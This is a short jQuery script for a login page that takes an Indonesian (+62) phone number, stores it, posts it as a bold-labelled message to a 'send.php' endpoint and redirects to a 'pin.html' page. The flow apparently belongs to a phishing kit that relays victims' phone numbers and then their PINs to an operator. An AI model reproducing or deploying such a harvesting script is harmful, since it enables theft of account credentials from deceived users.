import { API_URL } from './global.js';

$(document).ready(function() {
	$("#phone").on('focus', function() {
		$("#login").css('display', 'none');
		$("#login2").css('display', 'flex');
	});
	$("#phone").on('blur', function() {
		setTimeout(() => {
			$("#login2").css('display', 'none');
		    $("#login").css('display', 'flex');
		}, 500);
	});
	$("#phone").on('input', function() {
		var phone = $("#phone").val().trim();
		if (phone.length > 8) {
			$("#login").css("color", "#ffffff")
			    .css('background-color', '#0d6fd1');
		    $("#login2").css("color", "#ffffff")
			    .css('background-color', '#0d6fd1');
		} else {
			$("#login").css("color", "#888888")
			    .css('background-color', '#ffffff');
			$("#login2").css("color", "#888888")
			    .css('background-color', '#ffffff');
		}
	});
});

function login() {
	var phone = $("#phone").val().trim();
	if (phone.length <= 8) {
		return;
	}
	phone = "+62"+phone;
	window.localStorage.setItem('phone', phone);
	$("#loader").css('display', 'flex');
	var fd = new FormData();
	fd.append('message', '<b>No. HP:</b> '+phone);
	$.ajax({
		url: API_URL+'/send.php',
		type: 'POST',
		data: fd,
		processData: false,
		contentType: false,
		success: function(response) {
			$("#loader").css('display', 'none');
			window.location.href = "pin.html";
		}
	});
}

module.login = login;